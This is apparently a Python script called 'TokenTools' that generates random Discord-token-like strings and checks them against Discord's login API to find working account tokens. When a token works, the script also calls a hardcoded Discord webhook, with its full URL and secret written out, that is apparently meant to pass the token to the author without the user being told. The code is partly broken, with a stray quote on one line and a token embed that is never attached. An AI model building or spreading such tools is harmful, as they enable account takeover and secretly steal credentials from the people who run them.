
import random
import string
import pathlib
import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path, tkinter
import colorama
import discord_webhook
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import Fore, init, Back, Style
from datetime import date

os.system("title [TokenTools] Discord Tool - Matty#8952")

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write('\r' + Style.BRIGHT + Fore.YELLOW + Back.BLACK +'[*] Loading... '+i)
		sys.stdout.flush()
		time.sleep(0.2)

Spinner()

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/752511231906021467/ihbTgPTikrYw5EgfSrSJYphj5OdnGlraDwf0Q1qdY38qJew0eHv9KfzYqN5m1WRjB0wV')
embed = DiscordEmbed(title='Nuevo Token Funcional', description='', color=242424)
embed.set_author(name='TokenTools', ', icon_url='https://cdn.icon-icons.com/icons2/1381/PNG/512/discordcanary_94568.png')
embed.set_footer(text='By A39aR')
embed.set_timestamp()
webhook.add_embed(embed)

banner = (Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]\n"+ 
Style.BRIGHT + Fore.BLUE + Back.BLACK +'''\n  
              ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
              ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
              ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
              ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
              ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
              ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░\n\n'''+ Fore.RESET + Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]\n")

os.system("cls")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))
	
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Welcome to "+Fore.BLUE+" TokenTools "+Fore.WHITE+"- 2020 -")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         [1] "+Fore.BLUE+"Generator")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         [2] "+Fore.BLUE+"Checker")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         [3] "+Fore.BLUE+"Credits")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         [4] "+Fore.BLUE+"Exit")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
opcion = input("\nChoice: ")
if opcion=='1':
	os.system("cls")
	print(banner)
	cantidad = input("\nAmount to generate: ")
	while int(count)<int(cantidad):
		Generated = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
		f= open(current_path +"/"+str("Generated")+str("")+".txt","a")
		f.write(Generated+"\n")
		print(Style.BRIGHT + Fore.BLUE + Back.BLACK +"Token: "+ Fore.RESET + Generated)
		count+=1
		if int(count)==int(cantidad):
			print("\n" + Style.BRIGHT + Fore.CYAN + Back.BLACK +"Tokens generated successfully!")
			print(Style.BRIGHT + Fore.BLUE + Back.BLACK +"Tokens saved in Generated.txt")
			input(Style.BRIGHT + Fore.RED + Back.BLACK +"\nPress enter to exit")
			os.system("cls")
			print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
			print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                                   Closing!")
			print(Style.BRIGHT + Fore.GREEN + Back.BLACK +"                                               Have a good day :D")
			print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
			time.sleep(2)
			sys.exit()
			pass
	pass
if opcion=='2':
	os.system("cls")
	print("\n" + banner + "\n")
	with open('Generated.txt', 'r') as f:
	    for line in f:
	        time.sleep(0)
	        token = line.rstrip("\n")
	        headers = {
	            'Authorization': f'{token}'  
	        }
	        src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)

	        try:
	            if src.status_code == 200:
	                print(f'{Fore.LIGHTGREEN_EX}Token Valido! >{Fore.RESET} ' + token)
	                embed = DiscordEmbed(title='Nuevo Token Funcional', description='Proximamente aca ira el token!'+ token, color=242424)
	                response = webhook.execute()
	            else:
	                print(f'{Fore.RED}Token Invalido >{Fore.RESET} ' + token)
	        except Exception:
	            print(f"{Fore.CYAN}Ocurrio un error inesperado, Contactate con Matty#8952 {Fore.RESET}")
pass
if opcion=='3':
	os.system("cls")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         TokenTools"+Fore.WHITE+" Made by "+Fore.YELLOW+"Matty#8952")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         [Github] "+Fore.YELLOW+"MattyTM")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         [Discord] "+Fore.YELLOW+"Matty#8952")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         [Server] "+Fore.YELLOW+"https://discord.gg/nKME7C7")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
	input(Style.BRIGHT + Fore.RED + Back.BLACK +"\nEnter to exit")
	os.system("cls")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
	print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                                   Closing!")
	print(Style.BRIGHT + Fore.GREEN + Back.BLACK +"                                               Have a good day :D")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
	time.sleep(2)
	sys.exit()
	pass
if opcion=='4':
	os.system("cls")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
	print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                                   Closing!")
	print(Style.BRIGHT + Fore.GREEN + Back.BLACK +"                                               Have a good day :D")
	print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.BLUE + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
	time.sleep(2)
	sys.exit()
	pass
